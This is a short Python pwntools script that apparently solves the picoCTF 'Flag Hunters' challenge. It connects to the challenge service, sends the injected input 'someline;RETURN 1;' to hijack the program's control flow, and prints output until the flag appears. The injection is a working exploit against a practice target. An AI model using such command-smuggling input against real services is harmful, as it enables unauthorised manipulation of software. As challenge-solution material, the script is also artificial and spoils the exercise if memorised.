from pwn import *
import argparse

parser = argparse.ArgumentParser(description='Flag Hunters')
parser.add_argument('--host', type=str, default='localhost', help='Host to connect to')
parser.add_argument('--port', type=int, default=1337, help='Port to connect to')
args = parser.parse_args()


conn = remote(args.host, args.port)
print(conn.recvuntil("Crowd:").decode("UTF-8"))
conn.sendline(b'someline;RETURN 1;')
while True:
    try:
        line = conn.recvline(timeout=1).decode("UTF-8")
        if "picoCTF{" in line:
            print(line.strip())
            break
        print(line.strip())
    except EOFError:
        break
    except TimeoutError:
        continue 


